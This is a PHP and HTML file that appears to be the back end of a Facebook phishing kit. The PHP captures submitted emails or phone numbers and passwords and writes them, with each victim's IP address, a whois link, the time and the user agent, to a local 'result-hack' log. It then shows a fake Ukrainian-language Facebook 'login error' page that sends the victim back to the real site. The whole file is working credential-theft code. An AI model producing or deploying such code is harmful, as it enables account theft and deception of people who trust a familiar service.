<?php
$count = rand(10000, 90000);
$email = $_POST['email'];
$pass = $_POST['pass'];
$data = date("d.m.Y");
$time = date("H:i");   
$ip0 = $_SERVER['REMOTE_ADDR'];
$ip = "https://www.nic.ru/whois/?ip=$ip0";
$agent = trim($_SERVER['HTTP_USER_AGENT']);
$file = fopen("result-hack/file.log","at");
fwrite($file,"ID сесии: $count\nПочта/Номер телефона: $email\nПароль: $pass\nДата входа: $data\nВремя входа: $time (МСК)\nIP-адрес: $ip0\nПоиск по IP: $ip\nСистема: $agent\n-----------------------------\n");
fclose($file);
?>
<HTML>
<head>
	<link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yv/r/B8BxsscfVBr.ico" />
	<title id="pageTitle">Помилка при вході — Facebook</title>
	<style>
	body{
		background: #f0f2f5;
	}
	.btn{
    background-color: #1877f2;
    color: white;
    text-decoration: none;
    border: none;
    border-radius: 6px;
    font-size: 20px;
    line-height: 48px;
    padding: 0 16px;
    width: 332px;
    cursor: pointer;
    display: inline-block;
    text-decoration: none;
    white-space: nowrap;
	}
	img{
		pointer-events: none;
		}
	</style>
</head>
<body>
	<center>
		<br><br><br><br>
		<img src="img/f.png">
		<br><br><br>
		<a class="btn" href="https://uk-ua.facebook.com/"><strong>Спробувати знову</strong></a>
	</center>
</body>
</HTML>